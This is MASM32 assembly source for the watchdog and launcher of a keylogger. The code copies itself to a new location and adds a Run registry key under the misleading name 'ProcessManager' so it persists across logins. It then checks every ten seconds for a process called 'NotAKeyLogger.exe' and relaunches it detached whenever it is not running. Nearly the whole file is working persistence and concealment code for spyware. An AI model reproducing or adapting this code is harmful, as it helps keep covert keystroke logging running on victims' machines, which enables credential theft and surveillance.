include D:\masm32\include\masm32rt.inc

LaunchLogger PROTO
WinMain PROTO :DWORD, :DWORD, :DWORD, :DWORD
CompareStrings PROTO :DWORD, :DWORD
Process32Next PROTO :DWORD, :DWORD
Process32First PROTO :DWORD, :DWORD

.DATA
fileLocation db 'D:\KeyloggerMonitor.exe', 0
processName db 'NotAKeyLogger.exe', 0
launchableLocation db 'D:\NotAKeyLogger.exe', 0
valueName db 'ProcessManager', 0
autoKey db 'Software\Microsoft\Windows\CurrentVersion\Run', 0
launchedProcessInfo PROCESS_INFORMATION <>																			;struct

.DATA?
fileName dw MAX_PATH dup(?)
hInstance dd ?
lpszCmdLine dd ?
hKey dd ?
fileLocationBuffer db 1000 dup(?)
exitCode dd ?

.CODE
MAIN:

;***************Get EXE Location And Move To Other Directory***************

						INVOKE			GetModuleFileName, hInstance, OFFSET fileLocationBuffer, MAX_PATH
						INVOKE			MoveFile, ADDR fileLocationBuffer, ADDR fileLocation

;**************Create Registry Key For Self Startup************************

						INVOKE			RegCreateKeyEx, HKEY_CURRENT_USER, ADDR autoKey, 0, 0, 0, KEY_ALL_ACCESS, 0, ADDR hKey, 0
						INVOKE			lstrlen, ADDR fileLocation
						INVOKE			RegSetValueEx, hKey, ADDR valueName, 0, REG_SZ, ADDR fileLocation, eax
						mov				eax, 1

						INVOKE			GetModuleHandle, NULL
						mov				hInstance, eax				

						INVOKE			GetCommandLine
						mov				lpszCmdLine, eax

						INVOKE			WinMain, hInstance, 
											NULL,
											lpszCmdLine,
											SW_SHOWDEFAULT

;*****************Stay As Background Process**************************

WinMain PROC hInst:DWORD, hPrevInst:DWORD, szCmdLine:DWORD, nShowCmd:DWORD

LOCAL msg:MSG
LOCAL hProcessSnap:HANDLE 
LOCAL process:PROCESSENTRY32

						INVOKE			Sleep, 10000																						;small break to wait until all processes will be launched (prevents duplicates during windows startup)
						INVOKE			CreateToolhelp32Snapshot, TH32CS_SNAPPROCESS, 0							;snapshot of all running processes
						mov				hProcessSnap, eax
						mov				process.dwSize, SIZEOF process
						INVOKE			Process32First, hProcessSnap, ADDR process										;check if something exists in snapshot
						test				eax, eax
						je					MessagePump	
LoopOverProc:	
						INVOKE			Process32Next, hProcessSnap, ADDR process
						cmp				eax, ERROR_SUCCESS																		;end of enumeration, nothing was found
						je					LaunchExe																							
						cmp				eax, ERROR_NO_MORE_FILES																;same as above, but it is unclear from 
																																					;microsoft documentation which one to use, so using both checks
						je					LaunchExe
						INVOKE			CompareStrings, ADDR processName, ADDR process.szExeFile
						test				eax, eax
						jnz				MessagePump																					;our proc returned eax as 1 (equals)
						jmp				LoopOverProc																						
LaunchExe:		
						call				LaunchLogger
MessagePump:																																;loop to keep alive	
						INVOKE			GetExitCodeProcess, launchedProcessInfo.hProcess, ADDR exitCode		;check if logger is running
						cmp				exitCode, STILL_ACTIVE
						je					SleepTime																					
						call				LaunchLogger
						jmp				SleepTime
SleepTime:				
						INVOKE			Sleep, 10000																						;sleep to prevent perfomance overhead due to constant process checks
						jmp				MessagePump

WinMain ENDP

;*******************Launch Main Key Logger*********************************

LaunchLogger PROC

LOCAL startInfo:STARTUPINFO

						INVOKE			GetStartupInfo, ADDR startInfo
						INVOKE			CreateProcess, ADDR launchableLocation, 0, 0, 0, FALSE,
																	DETACHED_PROCESS, 0, 0,
																	ADDR startInfo, ADDR launchedProcessInfo
						ret

LaunchLogger ENDP

;*******************Compare Strings**********************************

CompareStrings PROC string1:DWORD, string2:DWORD

						xor			eax, eax
						mov			esi, [string2]
						mov			edi, [string1]
						mov			ecx, 18																									;size of "NotAKeyLogger.exe" string
						repz			cmpsb
						jnz			Exit
						jz				Equal
Equal:				
						inc			eax
Exit:
						ret

CompareStrings ENDP

;**********************END******************************************

END MAIN